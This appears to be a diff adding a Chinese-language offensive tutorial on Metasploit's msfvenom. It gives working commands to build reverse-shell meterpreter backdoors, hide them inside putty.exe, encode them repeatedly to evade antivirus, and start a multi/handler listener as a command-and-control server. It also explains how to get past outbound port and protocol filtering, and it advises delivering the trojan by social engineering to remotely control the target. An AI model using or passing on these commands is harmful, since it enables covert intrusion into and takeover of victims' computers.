@@ -1,0 +1,163 @@
+一 使用msf制毒（msfvenom + payload）
+（一）制作backdoor：这需要你对msf的payload一级模块有一定的认识，事实上虽然看上去1400多种payloads，但其实也就那么几种：
+1 payload的一二级模块：
+（1）一级：platform：linux、windows、android、mac、apple等。
+（2）二级（有的没有）：arch：x64、x86_64（386）、mips等。
+
+2 子模块（也不是每种paltform都有下面这些（比如android就没有bind，这是合理的，移动端几乎不可能暴露在公网上，因而bind是完全没必要的），但是总的来说有这些）：
+（1）meterpreter和shell。
+（2）内联（inline）和分阶段（stager）。
+（3）reverse和bind。
+（4）tcp还是http还是https或者tls。
+
+总结：因而在制作后门前，你首先要弄清楚你的target的platform和arch，其次你要确定自己选择什么类型的后门，这个要视具体情况而定，一般我会选择meterpreter-stager-reverse-https，我认为这是一般情况下的最佳选择。
+
+
+
+（二）明确C2的监听IP和端口（MSF称为LHOST，LPORT）：
+注：如果你选择了bind类型的后门，那么这一步是没有必要，但是reverse我感觉更有意义，因为攻击内网主机是主要的场景。
+
+制毒命令：
+msfvenom -p <payload> LHOST=<ip addr> LPORT=<port> -f <format> -o exeutable.format
+
+注：
+0 这里是最简单的直接生成payload的命令，如果你要做免杀（相比于裸露的payload会好一点，但是实际上也免不了杀），有如下命令（选项的具体解释详见msfvenom高级）：
+（1）制作以putty.exe为载体的木马：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -x putty.exe -k -f exe -o p.exe
+（2）制作加壳病毒：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -e x64/xor_dynamic -i 10 -f exe -o p.exe
+（3）通过raw制作加壳病毒（使用encoder模块加壳（cmd/powershell_base64和x86/shikata_ga_nai（覆水难收）比较好））：
+第一步：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw -o p.bin
+第二步：msfvenom -p - < p.bin -a x64 --platform windows -e x64/xor_dynamic -i 5 -f exe -o p.exe
+注意：基于raw文件在制作可执行文件时也得看raw的payload（arch、platform）。
+（4）制作以putty.exe为载体的加壳木马：
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -x putty.exe -k -e x86/shikata_ga_nai -i 10 -f exe -o p.exe
+（5）通过raw制作以putty.exe为载体的加壳木马（使用encoder模块加壳（cmd/powershell_base64和x86/shikata_ga_nai（覆水难收）比较好））：
+第一步：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw -o p.bin
+第二步：msfvenom -p - < p.bin -a x64 --platform windows -x putty.exe -k -e x64/xor_dynamic -i 5 -f exe -o p.exe
+注意：基于raw文件在制作可执行文件时也得看raw的payload（arch、platform）。
+
+1 msfvenom是一个独立于msfconsole的工具，没必要非在msf环境中执行。
+
+2 比如你的target的platform是linux，你就直接linux/......就行了。
+（1）<payload>不要带payload，不要带payload，不要带payload，-p就已经说明是payload这个模块了。
+（2）也不要带/。
+
+3 对回连限制的突破：
+（1）all_ports：有的内网环境会在用户出网时过滤目标端口（比如禁止用户连接4444端口，只允许用户连接某些端口等），使用all_ports进行组个尝试。
+（2）http和https的意义：有的内网环境会在用户出网时过滤协议（比如只允许用户使用http、https协议等）。
+
+
+
+（三）在C2上起RAT（payload可以自动在后台运行只能exploit命令，exploit的/multi/handler想要后台运行必须-j才能在后台运行可以exploit命令也可以run命令）：
+use <payload>;
+show options;
+set LHOST "C2的IP，注意有的云主机NAT了，因而其公网IP地址不是主机IP地址，要使用ip a获取真实的IP地址";
+set LPORT "和msfvenom设置的LPORT保持一致";
+exploit [-j];   // -j表示在后台运行
+
+
+
+（四）通过社工或者漏洞的方式将exeutable.file放在target上执行，成功的关键在于关键在于免杀。
+
+
+
+（五）如果你不想进行复杂的APT，那么这个后门足够了，你可以愉快地远控target了。
+
+
+
+（六）相关命令
+1 session：你可以使用sessions命令管理任一meterpreter会话或shell会话：
+（1）如何展示当前所有会话？可以展示出session_id等信息。
+sessions，sessions -l，sessions -t
+注：sessions -t可以根据类型过滤会话，比如只展示shell会话：sessions -t shell
+（2）查看当前在哪个会话
+sessions -c
+（3）切换到某个会话
+sessions -i <session_id>
+（4）结束某个会话
+sessions -k <session_id>
+（5）结束所有会话
+sessions -K
+（6）在后台执行会话
+sessions -b <session_id>
+
+2 jobs：管理监听器：
+（1）显示当前的监听器：
+jobs
+（2）删除某个监听器：
+jobs -k <job_id>
+
+
+
+
+
+
+
+二 msfvenom高级
+（一）-f概览
+1 Framework Executable Formats:
+asp, aspx：ASP.NET Web 应用程序格式
+axis2：Apache Axis2 Web服务框架格式
+dll：动态链接库格式
+elf, elf-so：Linux可执行格式和共享对象格式
+exe, exe-only, exe-service, exe-small：Windows可执行格式,包括标准可执行文件、纯可执行文件、Windows服务和精简版
+hta-psh, psh, psh-cmd, psh-net, psh-reflection：PowerShell脚本格式
+jar：Java档案格式
+jsp：Java Server Pages Web应用程序格式
+loop-vbs：VBScript 循环格式
+macho：macOS可执行格式
+msi, msi-nouac：Windows安装程序格式,包括标准和无需管理员权限的版本
+osx-app：macOS应用程序格式
+vba, vba-exe, vba-psh：Visual Basic for Applications脚本格式
+vbs：VBScript格式
+war：Java Web应用程序归档格式
+
+2 Framework Transform Formats:
+这些格式用于将shellcode转换为其他语言、编码的格式等。
+它们包括base32、base64、bash、c、csharp、dw、dword、go、golang、hex、java、js_be、js_le、masm、nim、nimlang、num、octal、perl、pl、powershell、ps1、py、python、raw、rb、ruby、rust、rustlang、sh、vbapplication、vbscript、zig等。
+
+
+
+（二）-x <template>
+将病毒植入正常程序。
+
+
+
+（三）-k
+避免卡顿
+
+
+
+（四）-e <encoder>
+1 指定编码器.
+2 可以使用 msfvenom -l encoders 查看所有的encoder。 
+3 比较好的encoder：
+（1）cmd/powershell_base64
+（2）x86/shikata_ga_nai
+
+
+
+（五）-i <num>
+指定迭代次数。
+
+
+
+（六）-f raw
+生成原始shellcode，生成的shellcode可以作为exe、elf等其他格式文件的原始文件。
+
+
+
+（七）-a <arch>
+
+
+
+（八）--platform <platform>
+
+
+
+（九）-o == >
+输出文件。
+
+
+
+（十）< <file>
+导入文件
